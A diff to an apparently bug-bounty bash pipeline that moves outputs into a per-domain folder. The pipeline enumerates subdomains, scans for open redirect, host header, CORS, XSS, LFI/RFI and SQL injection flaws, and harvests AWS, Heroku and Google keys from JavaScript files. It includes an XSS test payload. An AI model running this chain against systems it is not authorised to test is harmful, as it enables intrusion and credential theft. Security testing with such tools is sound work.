@@ -35,40 +35,41 @@ if [ -z "$domain" ]; then
     usage
 fi
 
+mkdir $domain
 echo "[+] Step 1: Running spyhunt.py to find subdomains for $domain..."
-python3 ~/tools/spyhunt/spyhunt.py -s "$domain" --save subdomains
+python3 ~/tools/spyhunt/spyhunt.py -s "$domain" --save $domain/subdomains
 
 echo "[+] Step 2: Checking for live subdomains using httpx-toolkit..."
-httpx-toolkit -l subdomains -ports 80,443,8000,8080,8888 -threads 200 -o alivesubs 
+httpx-toolkit -l $domain/subdomains -ports 80,443,8000,8080,8888 -threads 200 -o $domain/alivesubs 
 
 echo "[+] Step 3: Openredirect Check"
 python3 Resources/Openredirect.py $domain
 
 echo "[+] Step 4: Host Header Injection scan"
-sudo bash Resources/HostHeaderScan.sh -l alivesubs | grep "is vuln" > hhscanvulns
+sudo bash Resources/HostHeaderScan.sh -l $domain/alivesubs | grep "is vuln" > $domain/hhscanvulns
 
 echo "[+] Step 5: Cors Exploit scan"
-python3 ~/tools/Corsy/corsy.py -i alivesubs > CorsyScan
+python3 ~/tools/Corsy/corsy.py -i $domain/alivesubs > $domain/CorsyScan
 
 echo "[+] Step 6: Crawling Parameters and filtering them"
-cat alivesubs | gau --threads 5 | uro > links
+cat $domain/alivesubs | gau --threads 5 | uro > $domain/links
 
 echo "[+] Step 7: Filtering JS links and finding sensitive data in them"
-cat links | grep ".js$" > jsfiles.txt
-cat jsfiles.txt | while read url; do python3 ~/tools/SecretFinder/SecretFinder.py -i $url -o cli >> secret.txt; done
-cat secret.txt | grep aws > awsapi.txt
-cat secret.txt | grep Heroku > herokuapi.txt
-cat secret.txt | grep google > googleapi.txt
+cat $domain/links | grep ".js$" > $domain/jsfiles.txt
+cat $domain/jsfiles.txt | while read url; do python3 ~/tools/SecretFinder/SecretFinder.py -i $url -o cli >> $domain/secret.txt; done
+cat $domain/secret.txt | grep aws > $domain/awsapi.txt
+cat $domain/secret.txt | grep Heroku > $domain/herokuapi.txt
+cat $domain/secret.txt | grep google > $domain/googleapi.txt
 
 echo "[+] Step 8: Filtering XSS parameters and Testing Target on XSS"
-cat links | gf xss > xsslinks
+cat $domain/links | gf xss > $domain/xsslinks
 payload="<sCript>confirm(1)</sCript>"
-cat xsslinks | qsreplace $payload | xsschecker -match $payload -vuln
+cat $domain/xsslinks | qsreplace $payload | xsschecker -match $payload -vuln
 
 echo "[+] Step 9: Filtering LFI parameters and Testing Target on LFI/RFi/Data Traversal"
-cat links | gf lfi > lfilinks
-nuclei -l lfilinks -tags lfi,rfi
+cat $domain/links | gf lfi > $domain/lfilinks
+nuclei -l $domain/lfilinks -tags lfi,rfi
 
 echo "[+] Step 10: SQLI Scan (niakos pativiscemit)"
-cat links | gf sqli > sqlilinks
+cat $domain/links | gf sqli > $domain/sqlilinks
 python3 Resources/ErrorBasedSqli.py
